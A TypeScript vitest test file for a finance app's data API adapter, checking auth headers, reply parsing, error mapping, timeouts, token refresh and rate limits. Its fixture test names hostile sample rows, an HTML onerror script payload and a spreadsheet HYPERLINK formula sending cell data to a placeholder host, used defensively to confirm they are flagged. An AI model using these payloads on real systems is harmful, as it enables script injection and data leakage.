import { ROUTES } from '@smart-finances/contracts/routes';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { Container } from './container';
import { memoryContainer } from './container';
import { DATA_API_TIMEOUT_MS, HttpDataApi, type DataApiFetch } from './data-api';
import { MemoryClock } from './memory/clock';
import { fixtureSeed, MemoryDataApi } from './memory/data-api';
import { MemoryIdentityProvider } from './memory/identity-provider';
import type { MemoryLogger } from './memory/logger';
import { MemorySettings, TEST_SETTINGS } from './memory/settings';
import hostileFixture from '../../fixtures/hostile.json';

const hostileIds = new Set(hostileFixture.transactions.map((t) => t.id));

// T-WSCR-1 (AC-6, AC-15, D-53, D-101, D-133): the data API adapter sends the bearer token, parses replies with the
// contracts, maps statuses and times out at 5 seconds. Synthetic tokens and data only; no network: fetch is a fake.

const SUB = '00000000-0000-4000-9000-00000000a001';
const part = (o: object) => Buffer.from(JSON.stringify(o)).toString('base64url');
const token = (sub: string, n = 0) => `${part({ alg: 'none' })}.${part({ sub, n, token_use: 'access' })}.test`;
const TOKEN = token(SUB);
const API = 'https://api.qa.example.test';

type Call = { url: string; init: Parameters<DataApiFetch>[1] };
type Reply = { status: number; body?: unknown; headers?: Record<string, string> };

function reply({ status, body, headers = {} }: Reply) {
  const text = typeof body === 'string' ? body : body === undefined ? '' : JSON.stringify(body);
  return { status, headers: { get: (n: string) => headers[n.toLowerCase()] ?? null }, text: async () => text };
}

function fakeFetch(answer: (call: Call, i: number) => Reply | Promise<Reply>) {
  const calls: Call[] = [];
  const fetch: DataApiFetch = async (url, init) => {
    const call = { url, init };
    calls.push(call);
    return reply(await answer(call, calls.length - 1));
  };
  return { fetch, calls };
}

function setup(answer: (call: Call, i: number) => Reply | Promise<Reply>, stage: 'test' | 'qa' = 'qa') {
  const clock = new MemoryClock(Date.UTC(2026, 10, 5, 12, 0, 30));
  const c: Container = memoryContainer(new MemorySettings({ ...TEST_SETTINGS, STAGE: stage, API_URL: API }), clock);
  const f = fakeFetch(answer);
  const api = new HttpDataApi({ ...c, fetch: f.fetch });
  return { c, api, calls: f.calls, clock };
}

const tx = (id: string) => ({
  id,
  date: '2026-05-02',
  date_precision: 'day',
  kind: 'expense',
  amount: -12345,
  currency: 'ARS',
  category: 'Groceries',
  merchant: 'Shop',
  description_raw: 'SHOP',
  source: 'mercadopago',
  source_ref: id,
  country: 'AR',
  flags: [],
  import_batch: 'b1',
  review: { reasons: [], approved: false },
});

afterEach(() => {
  vi.useRealTimers();
  vi.restoreAllMocks();
});

describe('T-WSCR-1: HttpDataApi requests', () => {
  it('T-WSCR-1: sends the access token as a bearer token, one route per method, never cached or redirected (D-53)', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: { items: [tx('a')], cursor: 'c2' } }));
    const r = await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-06', kind: 'expense', q: 'shop & co' });
    expect(r).toEqual({ ok: true, data: { items: [tx('a')], cursor: 'c2' } });
    const [call] = calls;
    expect(calls).toHaveLength(1);
    const url = new URL(call!.url);
    expect(url.origin + url.pathname).toBe(`${API}/transactions`);
    expect(Object.fromEntries(url.searchParams)).toEqual({
      from: '2026-05',
      to: '2026-06',
      kind: 'expense',
      q: 'shop & co',
      sort: 'date',
      order: 'desc',
      limit: '50',
    });
    expect(call!.init.method).toBe('GET');
    expect(call!.init.headers.authorization).toBe(`Bearer ${TOKEN}`);
    expect(call!.init.body).toBeUndefined();
    expect(call!.init.cache).toBe('no-store');
    expect(call!.init.redirect).toBe('error');
    expect(call!.init.signal).toBeInstanceOf(AbortSignal);
  });

  it('T-WSCR-1: path values are encoded and bodies are JSON for each changing route', async () => {
    const replies: Record<string, unknown> = {
      'PUT /rates/2026-05': { month: '2026-05', ars_per_usd: 1321.07 },
      'PUT /transactions/id%2F..%3Fx/review': { review: { reasons: [], approved: true } },
      'GET /imports/imp%201': {
        import_id: 'imp 1',
        source: 'csv',
        file_name: 'a.csv',
        period: '2026-05',
        status: 'done',
        created_at: '2026-05-01T00:00:00Z',
        active: true,
      },
      'POST /imports': { import_id: 'i1', upload: { url: 'https://uploads.qa.example.test/', fields: { key: 'k' } }, expires_at: 'x' },
      'DELETE /data': { deleted: { items: 3, files: 1 } },
    };
    const { api, calls } = setup((call) => {
      const key = `${call.init.method} ${new URL(call.url).pathname}`;
      return { status: key === 'POST /imports' ? 201 : key === 'DELETE /data' ? 202 : 200, body: replies[key] };
    });
    expect((await api.putRate(TOKEN, { month: '2026-05', ars_per_usd: 1321.07 })).ok).toBe(true);
    expect((await api.putReview(TOKEN, { id: 'id/..?x', date: '2026-05-02', approved: true })).ok).toBe(true);
    expect((await api.getImport(TOKEN, { id: 'imp 1' })).ok).toBe(true);
    expect((await api.requestImport(TOKEN, { source: 'csv', file_name: 'a.csv', size: 10 })).ok).toBe(true);
    expect(await api.erase(TOKEN, { confirm: 'DELETE' })).toEqual({ ok: true, data: { deleted: { items: 3, files: 1 } } });
    expect(calls.map((c) => `${c.init.method} ${new URL(c.url).pathname} ${c.init.body ?? ''}`)).toEqual([
      'PUT /rates/2026-05 {"ars_per_usd":1321.07}',
      'PUT /transactions/id%2F..%3Fx/review {"date":"2026-05-02","approved":true}',
      'GET /imports/imp%201 ',
      'POST /imports {"source":"csv","file_name":"a.csv","size":10}',
      'DELETE /data {"confirm":"DELETE"}',
    ]);
    for (const c of calls) expect(c.init.headers.authorization).toBe(`Bearer ${TOKEN}`);
    for (const c of calls.filter((c) => c.init.body)) expect(c.init.headers['content-type']).toBe('application/json');
  });

  it('T-WSCR-1: an input the contracts refuse never reaches the API', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: {} }));
    expect(await api.listTransactions(TOKEN, { from: '2026-07', to: '2026-05' })).toEqual({ ok: false, kind: 'failed', code: 'bad_request' });
    expect(await api.putRate(TOKEN, { month: '2026-13', ars_per_usd: 1 })).toEqual({ ok: false, kind: 'failed', code: 'bad_request' });
    expect(calls).toHaveLength(0);
  });

  it('T-WSCR-1: a token without a person is refused without a request', async () => {
    const { api, calls } = setup(() => ({ status: 200, body: { items: [] } }));
    expect(await api.rates('not-a-jwt', {})).toEqual({ ok: false, kind: 'unauthorized' });
    expect(calls).toHaveLength(0);
  });
});

describe('T-WSCR-1: HttpDataApi replies are parsed with @smart-finances/contracts (D-133)', () => {
  it('T-WSCR-1: a reply that does not match the contract is a failure, never passed on', async () => {
    const { api } = setup(() => ({ status: 200, body: { items: [{ ...tx('a'), amount: 12.5 }] } }));
    expect(await api.listTransactions(TOKEN, { from: '2026-05', to: '2026-05' })).toEqual({ ok: false, kind: 'failed', code: 'bad_reply' });
  });

  it('T-WSCR-1: a reply that is not JSON is a failure', async () => {
    const { api } = setup(() => ({ status: 200, body: '<html>gateway</html>' }));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'failed', code: 'bad_reply' });
  });

  it('T-WSCR-1: unknown fields are dropped by the schema', async () => {
    const { api } = setup(() => ({ status: 200, body: { items: [{ month: '2026-05', ars_per_usd: 1300, extra: '<b>x</b>' }] } }));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: true, data: { items: [{ month: '2026-05', ars_per_usd: 1300 }] } });
  });

  it('T-WSCR-1: the export is the CSV text as sent', async () => {
    const csv = `${(ROUTES['GET /export'].columns as readonly string[]).join(',')}\n"a","b"`;
    const { api, calls } = setup(() => ({ status: 200, body: csv, headers: { 'content-type': 'text/csv' } }));
    expect(await api.exportCsv(TOKEN, {})).toEqual({ ok: true, data: csv });
    expect(new URL(calls[0]!.url).pathname).toBe('/export');
  });
});

describe('T-WSCR-1: HttpDataApi maps statuses', () => {
  const error = (code: string) => ({ error: { code, message: 'synthetic' } });
  it.each([
    [403, error('unauthorized'), { ok: false, kind: 'not_found', code: 'unauthorized' }],
    [404, error('not_found'), { ok: false, kind: 'not_found', code: 'not_found' }],
    [409, error('conflict'), { ok: false, kind: 'conflict', code: 'conflict' }],
    [409, error('source_file_only'), { ok: false, kind: 'conflict', code: 'source_file_only' }],
    [400, error('bad_request'), { ok: false, kind: 'failed', code: 'bad_request' }],
    [413, error('too_large'), { ok: false, kind: 'failed', code: 'too_large' }],
    [429, { message: 'Too Many Requests' }, { ok: false, kind: 'failed', code: 'throttled', retryAfter: 7 }],
    [500, { message: 'Internal Server Error' }, { ok: false, kind: 'failed', code: 'server' }],
    [503, 'Service Unavailable', { ok: false, kind: 'failed', code: 'server', retryAfter: 7 }],
  ])('T-WSCR-1: HTTP %i is %j', async (status, body, expected) => {
    const headers = status === 429 || status === 503 ? { 'retry-after': '7' } : undefined;
    const { api } = setup(() => ({ status, body, headers }));
    expect(await api.getImport(TOKEN, { id: 'i1' })).toEqual(expected);
  });

  it('T-WSCR-1: a network failure is a failure with retry', async () => {
    const { api } = setup(() => Promise.reject(new Error('ECONNRESET')));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'failed', code: 'network' });
  });

  it('T-WSCR-1: times out at 5 seconds and aborts the request (D-101)', async () => {
    expect(DATA_API_TIMEOUT_MS).toBe(5_000);
    vi.useFakeTimers();
    let signal: AbortSignal | undefined;
    const { api } = setup((call) => {
      signal = call.init.signal;
      return new Promise<Reply>(() => {});
    });
    const pending = api.totals(TOKEN, { from: '2026-05', to: '2026-05' });
    await vi.advanceTimersByTimeAsync(4_999);
    expect(signal?.aborted).toBe(false);
    await vi.advanceTimersByTimeAsync(1);
    expect(await pending).toEqual({ ok: false, kind: 'failed', code: 'timeout' });
    expect(signal?.aborted).toBe(true);
  });

  it('T-WSCR-1: the 5 seconds cover a slow body too', async () => {
    vi.useFakeTimers();
    const slow: DataApiFetch = async () => ({ status: 200, headers: { get: () => null }, text: () => new Promise<string>(() => {}) });
    const c = memoryContainer(new MemorySettings({ ...TEST_SETTINGS, STAGE: 'qa', API_URL: API }));
    const pending = new HttpDataApi({ ...c, fetch: slow }).rates(TOKEN, {});
    await vi.advanceTimersByTimeAsync(5_000);
    expect(await pending).toEqual({ ok: false, kind: 'failed', code: 'timeout' });
  });
});

describe('T-WSCR-1: HttpDataApi on 401: one refresh, then signed out', () => {
  /** A memory pool user who finished setup: their refresh token is one the fake will refresh. */
  async function signedIn(c: Container, accessToken: string) {
    const idp = c.identityProvider as MemoryIdentityProvider;
    await idp.signUp('person@example.test', 'a long synthetic password', 'en');
    await idp.confirm('person@example.test', '123456');
    const first = await idp.passwordAuth('person@example.test', 'a long synthetic password');
    if (!first.ok || !('session' in first)) throw new Error('no challenge');
    const assoc = await idp.associate(first.session);
    if (!assoc.ok) throw new Error('no setup');
    const done = await idp.verifySetup('person@example.test', assoc.session, '000000');
    const user = await idp.adminGet('person@example.test');
    if (!done.ok || !user.ok) throw new Error('no tokens');
    return seed(c, user.sub, accessToken, done.tokens.refresh);
  }
  async function seed(c: Container, sub: string, accessToken: string, refreshToken: string) {
    const now = c.clock.now();
    await c.sessionStore.create({
      idHash: 'h1',
      sub,
      accessToken,
      idToken: 'id',
      refreshToken,
      createdAt: now,
      lastSeenAt: now,
      expiresAt: now + 3_600_000,
    });
    return sub;
  }

  it('T-WSCR-1: refreshes once, stores the new tokens and retries with the new access token', async () => {
    const { c, api, calls } = setup((_call, i) =>
      i === 0 ? { status: 401, body: { error: { code: 'unauthorized', message: 'x' } } } : { status: 200, body: { items: [] } },
    );
    const sub = await signedIn(c, 'pending');
    const old = token(sub, 1);
    await c.sessionStore.create({ ...(await c.sessionStore.get('h1'))!, accessToken: old });
    expect(await api.rates(old, {})).toEqual({ ok: true, data: { items: [] } });
    expect(calls).toHaveLength(2);
    const fresh = (await c.sessionStore.get('h1'))!.accessToken;
    expect(fresh).not.toBe(old);
    expect(calls[1]!.init.headers.authorization).toBe(`Bearer ${fresh}`);
  });

  it('T-WSCR-1: a second 401 signs the person out: the session row goes and the answer is unauthorized', async () => {
    const { c, api, calls } = setup(() => ({ status: 401, body: { error: { code: 'unauthorized', message: 'x' } } }));
    const sub = await signedIn(c, 'pending');
    const old = token(sub, 2);
    await c.sessionStore.create({ ...(await c.sessionStore.get('h1'))!, accessToken: old });
    expect(await api.rates(old, {})).toEqual({ ok: false, kind: 'unauthorized' });
    expect(calls).toHaveLength(2);
    expect(await c.sessionStore.get('h1')).toBeUndefined();
    const events = (c.logger as MemoryLogger).events.filter((e) => e.name === 'signout');
    expect(events).toEqual([{ name: 'signout', outcome: 'data_api_unauthorized', sub, requestId: expect.any(String) }]);
  });

  it('T-WSCR-1: a refused refresh signs out without a second request', async () => {
    const { c, api, calls } = setup(() => ({ status: 401, body: { error: { code: 'unauthorized', message: 'x' } } }));
    const sub = SUB;
    await seed(c, sub, TOKEN, 'unknown-refresh-token');
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'unauthorized' });
    expect(calls).toHaveLength(1);
    expect(await c.sessionStore.get('h1')).toBeUndefined();
  });

  it('T-WSCR-1: calls made together refresh only once', async () => {
    let old = '';
    const unauthorized = { status: 401, body: { error: { code: 'unauthorized', message: 'x' } } };
    const { c, api, calls } = setup((call) =>
      call.init.headers.authorization === `Bearer ${old}` ? unauthorized : { status: 200, body: { items: [] } },
    );
    const sub = await signedIn(c, 'pending');
    old = token(sub, 3);
    await c.sessionStore.create({ ...(await c.sessionStore.get('h1'))!, accessToken: old });
    const refresh = vi.spyOn(c.identityProvider, 'refresh');
    const [a, b] = await Promise.all([api.rates(old, {}), api.review(old, {})]);
    expect(a.ok && b.ok).toBe(true);
    expect(refresh).toHaveBeenCalledTimes(1);
    expect(calls).toHaveLength(4);
    // A later call in the same request, still holding the old token, uses the renewed one without a new refresh.
    expect((await api.rates(old, {})).ok).toBe(true);
    expect(refresh).toHaveBeenCalledTimes(1);
  });
});

describe("T-WSCR-1: HttpDataApi counts the person's requests (AC-17, D-120)", () => {
  it('T-WSCR-1: past the person limit the answer is limited with the wait, and nothing is sent', async () => {
    const { c, api, calls } = setup(() => ({ status: 200, body: { items: [] } }), 'test');
    for (let i = 0; i < 5; i++) expect((await api.rates(TOKEN, {})).ok).toBe(true);
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'limited', retryAfter: 30 });
    expect(calls).toHaveLength(5);
    const limited = (c.logger as MemoryLogger).events.filter((e) => e.name === 'rate_limited');
    expect(limited).toEqual([{ name: 'rate_limited', outcome: 'person', sub: SUB, requestId: expect.any(String) }]);
    // Another person is still served (AC-17).
    expect((await api.rates(token('00000000-0000-4000-9000-00000000b002'), {})).ok).toBe(true);
  });

  it('T-WSCR-1: the qa limit is 120 a minute', async () => {
    const { api } = setup(() => ({ status: 200, body: { items: [] } }));
    for (let i = 0; i < 120; i++) expect((await api.rates(TOKEN, {})).ok).toBe(true);
    expect(await api.rates(TOKEN, {})).toMatchObject({ ok: false, kind: 'limited' });
  });

  it('T-WSCR-1: a counter failure fails closed', async () => {
    const { c, api, calls } = setup(() => ({ status: 200, body: { items: [] } }));
    vi.spyOn(c.counter, 'incr').mockRejectedValue(new Error('down'));
    expect(await api.rates(TOKEN, {})).toEqual({ ok: false, kind: 'failed', code: 'unavailable' });
    expect(calls).toHaveLength(0);
  });
});

describe('T-WSCR-1: the memory adapter on the fixtures', () => {
  it('T-WSCR-1: the fixtures parse with the contracts, payments-report rows are source mercadopago, hostile rows included', () => {
    const seed = fixtureSeed();
    const rows = ROUTES['GET /transactions'].reply.parse({ items: seed.transactions });
    expect(rows.items.length).toBeGreaterThan(500);
    // The 8 adversarial rows of data/synthetic/transactions.csv, as payments-report rows to review.
    const hostile = rows.items.filter((t) => hostileIds.has(t.id));
    expect(hostile).toHaveLength(8);
    for (const t of hostile) expect([t.source, t.review.reasons]).toEqual(['mercadopago', ['needs_review']]);
    const texts = hostile.map((t) => t.description_raw);
    expect(texts).toContain('<img src=x onerror=alert(1)>');
    expect(texts).toContain('=HYPERLINK("http://example.invalid/?x="&A1,"click")');
    expect(texts.some((t) => t.length >= 2000)).toBe(true);
    expect(rows.items.filter((t) => t.review.reasons.length > 0)).toHaveLength(64 + 8);
    for (const i of seed.imports) expect(ROUTES['GET /imports/{id}'].reply.safeParse(i).success, i.import_id).toBe(true);
    expect(seed.imports.some((i) => i.skipped?.some((s) => s.reason === '<img src=x onerror=alert(1)>'))).toBe(true);
    expect(Object.keys(seed.rates)).toContain('2026-09');
    expect(seed.rates['2026-05']).toBe(1321.07);
  });

  it('T-WSCR-1: a memory data API with limits answers limited past the person limit', async () => {
    const c = memoryContainer();
    const api = new MemoryDataApi(c.clock, { limits: c, logger: c.logger });
    api.allowToken(TOKEN);
    api.seed(fixtureSeed());
    for (let i = 0; i < 5; i++) expect((await api.rates(TOKEN)).ok).toBe(true);
    expect(await api.rates(TOKEN)).toMatchObject({ ok: false, kind: 'limited' });
    expect(await api.rates('unknown')).toEqual({ ok: false, kind: 'unauthorized' });
  });
});

describe('T-WSCR-1: the container wires the real adapter (D-167)', () => {
  it('T-WSCR-1: STAGE=test seeds the test person with the fixtures behind the person limit', async () => {
    vi.stubEnv('STAGE', 'test');
    const SHARED = Symbol.for('smart-finances.container');
    delete (globalThis as { [SHARED]?: unknown })[SHARED];
    const { getContainer, TEST_PERSON } = await import('./container');
    const c = getContainer();
    const { createHash } = await import('node:crypto');
    const row = await c.sessionStore.get(createHash('sha256').update(TEST_PERSON.sessionId).digest('hex'));
    const r = await c.dataApi.listTransactions(row!.accessToken, { from: '2026-03', to: '2026-03' });
    expect(r.ok && r.data.items.length).toBe(50);
    delete (globalThis as { [SHARED]?: unknown })[SHARED];
    vi.unstubAllEnvs();
  });
});
